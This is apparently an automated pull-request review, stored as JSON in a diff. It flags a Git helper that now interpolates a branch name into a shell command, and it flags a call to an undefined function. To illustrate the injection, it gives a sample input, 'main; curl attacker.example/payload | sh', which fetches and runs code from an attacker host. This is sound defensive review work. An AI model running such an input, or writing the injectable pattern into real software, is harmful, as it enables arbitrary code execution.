@@ -1,0 +1,33 @@
+{
+  "schemaVersion": 1,
+  "planEntryId": "5b851b0094822aadf3fcc255",
+  "publication": {
+    "artifact": "canonical",
+    "fallback": false
+  },
+  "findings": [
+    {
+      "title": "[P1] Restore the argv-array spawn instead of interpolating `branch` into a shell command",
+      "body": "The diff replaces `execFileAsync(\"git\", [\"show\", branch])` — which passes `branch` as a single argv element with no shell interpretation — with a command string built by template interpolation. Once `execAsync` is defined as the shell-exec wrapper its name (and the prior `execFileAsync` promisified-helper pattern) implies, any caller-influenced value reaches `/bin/sh`: a ref name like `release;id` executes as `git show release; id`, and input such as `main; curl attacker.example/payload | sh` runs arbitrary commands with the process's privileges. Semicolons and many metacharacters are legal in Git ref names, so this is not limited to pathological input; benign names can also be mis-tokenized. It can additionally corrupt the error contract — an injected suffix can make the promise resolve even when `git show` itself fails. Keep the argv-array form (`execFile(\"git\", [\"show\", branch])`) so the value is never shell-interpreted.",
+      "severity": "P1",
+      "location": {
+        "path": "src/git.ts",
+        "side": "RIGHT",
+        "start": 15,
+        "end": 16
+      }
+    },
+    {
+      "title": "[P1] Define or import `execAsync` — it resolves to nothing",
+      "body": "The new line `return execAsync(command)` references a name that is neither imported nor declared: the module's only import is `execFile` from `node:child_process`, and the repository contains no other file that could define or re-export `execAsync`. Under TypeScript this fails compilation (`TS2304: Cannot find name 'execAsync'`); in plain JavaScript every call to `showBranch` rejects with `ReferenceError: execAsync is not defined`, so the exported function is uncallable as shipped. The lingering `execFile` import suggests the intended promisified helper (e.g. `promisify(execFile)`) was never created — note the base branch's `execFileAsync` reference had the same gap, so either define the helper here or call a real API.",
+      "severity": "P1",
+      "location": {
+        "path": "src/git.ts",
+        "side": "RIGHT",
+        "start": 16,
+        "end": 16
+      }
+    }
+  ],
+  "markdown": "# PR Review\n\n**Verdict:** request_changes\n\n## Overview\n\nThis PR rewrites the body of `showBranch` in `src/git.ts`, replacing an argv-array spawn (`execFileAsync(\"git\", [\"show\", branch])`) with an interpolated shell command string (`git show ${branch}`) executed via `execAsync`. The stated intent is to \"refine behavior while preserving existing contracts\" — but the change does the opposite on two fronts: it breaks the function outright (the helper it calls does not exist) and it replaces an injection-safe spawning contract with a shell-interpreted one.\n\nThe exported signature is unchanged and the change is small and focused, but both modified lines introduce real defects that should be fixed before merge.\n\n## Verification\n\nVerification did not run: no user-level `verificationBaselines` are configured, so the trusted baseline tool reported verification disabled (`action: list` returned no applicable names). Note: had one been configured, it would execute this PR's code unsandboxed (supervised only at the original POSIX process group level); an external sandbox/container wrapper is recommended for untrusted PRs. All findings below were instead confirmed by direct source inspection of the complete diff and the checked-out repository.\n\n## Findings\n\n### [P1] Restore the argv-array spawn instead of interpolating `branch` into a shell command\n**Severity:** P1\n**Rationale:** The diff replaces `execFileAsync(\"git\", [\"show\", branch])` — which passes `branch` as a single argv element with no shell interpretation — with a command string built by template interpolation. Once `execAsync` is defined as the shell-exec wrapper its name (and the prior `execFileAsync` promisified-helper pattern) implies, any caller-influenced value reaches `/bin/sh`: a ref name like `release;id` executes as `git show release; id`, and input such as `main; curl attacker.example/payload | sh` runs arbitrary commands with the process's privileges. Semicolons and many metacharacters are legal in Git ref names, so this is not limited to pathological input; benign names can also be mis-tokenized. It can additionally corrupt the error contract — an injected suffix can make the promise resolve even when `git show` itself fails. Keep the argv-array form (`execFile(\"git\", [\"show\", branch])`) so the value is never shell-interpreted.\n**Location:** `src/git.ts:15-16 RIGHT`\n\n### [P1] Define or import `execAsync` — it resolves to nothing\n**Severity:** P1\n**Rationale:** The new line `return execAsync(command)` references a name that is neither imported nor declared: the module's only import is `execFile` from `node:child_process`, and the repository contains no other file that could define or re-export `execAsync`. Under TypeScript this fails compilation (`TS2304: Cannot find name 'execAsync'`); in plain JavaScript every call to `showBranch` rejects with `ReferenceError: execAsync is not defined`, so the exported function is uncallable as shipped. The lingering `execFile` import suggests the intended promisified helper (e.g. `promisify(execFile)`) was never created — note the base branch's `execFileAsync` reference had the same gap, so either define the helper here or call a real API.\n**Location:** `src/git.ts:16 RIGHT`\n\n## Lane completeness\n\nAll requested lanes completed (overview, conventions-maintainability, correctness, correctness-contracts, security-performance, performance-resources; 6/6 semantically complete, none partial/failed).\n\n## Strengths and notes\n\n- Keeps the exported function name, parameter shape, and async signature unchanged, so callers need no updates.\n- The change is contained to a single small function, which makes the fix straightforward: restore the argv-array call and use a defined (promisified) `execFile` helper.\n- **Correctness:** the function currently cannot execute at all (undefined identifier), and once that is fixed the shell-string form introduces injection.\n- **Security:** this is a security regression — the pre-change argv-array contract is the documented safe pattern for passing untrusted values to subprocesses; the interpolated command string removes that guarantee.\n- **Performance:** no resource, cleanup, or scalability regressions identified in the changed lines."
+}
